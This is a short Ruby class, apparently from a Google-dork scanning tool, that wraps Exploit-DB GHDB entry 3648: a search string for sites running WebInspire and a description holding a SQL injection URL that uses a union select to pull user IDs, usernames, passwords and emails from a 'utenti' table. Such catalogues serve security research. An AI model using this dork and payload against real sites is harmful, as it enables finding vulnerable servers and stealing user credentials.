module Dorks
   class Dork3648 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3648",
            ghdb_url: "https://www.exploit-db.com/ghdb/3648",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-12-14",
            author: "anonymous",
            dork: <<~EDORK,
"POWERED BY: WEBINSPIRE"
EDORK
            description: <<~EDESC
Author: ghost-dz SQL Injection: http://server/pages.php?id=30+and+1=0+union+select+1,concat(id,0x3a,usr,0x3a,pwd,0x3a,email),3,4,5,6+from+utenti--
EDESC
         })

      end
   end
end
